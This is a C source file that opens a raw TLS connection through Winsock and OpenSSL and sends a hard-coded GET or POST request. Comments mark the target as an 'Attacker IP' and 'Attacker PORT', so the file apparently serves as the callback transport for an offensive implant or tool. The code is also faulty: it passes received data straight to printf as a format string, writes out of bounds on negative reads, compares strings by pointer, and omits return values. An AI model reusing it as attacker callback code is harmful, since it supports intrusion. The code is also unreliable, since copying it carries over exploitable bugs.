#include "RAW-HTTPS.h"

SSL* ssl;
int sock;

int RecvPacket()
{
	int len = 100;
	char buf[1000000];
	do {
		len = SSL_read(ssl, buf, 100);
		buf[len] = 0;
		printf(buf);
	} while (len > 0);
	if (len < 0) {
		int err = SSL_get_error(ssl, len);
		if (err == SSL_ERROR_WANT_READ)
			return 0;
		if (err == SSL_ERROR_WANT_WRITE)
			return 0;
		if (err == SSL_ERROR_ZERO_RETURN || err == SSL_ERROR_SYSCALL || err == SSL_ERROR_SSL)
			return -1;
	}
}

int SendPacket(const char* buf)
{
	int len = SSL_write(ssl, buf, strlen(buf));
	if (len < 0) {
		int err = SSL_get_error(ssl, len);
		switch (err) {
		case SSL_ERROR_WANT_WRITE:
			return 0;
		case SSL_ERROR_WANT_READ:
			return 0;
		case SSL_ERROR_ZERO_RETURN:
		case SSL_ERROR_SYSCALL:
		case SSL_ERROR_SSL:
		default:
			return -1;
		}
	}
}


void log_ssl()
{
	int err;
	while (err = ERR_get_error()) {
		char* str = ERR_error_string(err, 0);
		if (!str)
			return;
		printf(str);
		printf("\n");
		fflush(stdout);
	}
}


int rawhttps(const char* ip,const char* method)
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("error\n");
		return 0;
	}

	int s;
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (!s) {
		printf("Error creating socket.\n");
		return -1;
	}
	struct sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(ip); // Attacker IP
	sa.sin_port = htons(443); // Attacker PORT
	socklen_t socklen = sizeof(sa);
	if (connect(s, (struct sockaddr*)&sa, socklen)) {
		printf("Error connecting to server.\n");
		return -1;
	}
	SSL_library_init();
	SSLeay_add_ssl_algorithms();
	SSL_load_error_strings();
	const SSL_METHOD* meth = TLS_client_method();
	SSL_CTX* ctx = SSL_CTX_new(meth);
	ssl = SSL_new(ctx);
	if (!ssl) {
		printf("Error creating SSL.\n");
		log_ssl();
		return -1;
	}
	sock = SSL_get_fd(ssl);
	SSL_set_fd(ssl, s);

	int err = SSL_connect(ssl);
	if (err <= 0) {
		printf("Error creating SSL connection.	err=%x\n", err);
		log_ssl();
		fflush(stdout);
		return -1;
	}
	printf("SSL connection using %s\n", SSL_get_cipher(ssl));

	if (method == "GET")
	{
		const char* request = "GET / HTTP/1.0\x0D\x0A\x0D\x0A";
		SendPacket(request);
		RecvPacket();
	}
	else
	{
		const char* request = "POST / HTTP/1.1\r\nHost:192.168.1.3\r\nConnection:close\r\nContent-Length:9\r\nContent-Type:application/x-www-form-urlencoded\r\n\r\nname=nina";
		SendPacket(request);
		RecvPacket();
	}

	WSACleanup();
	return 0;
}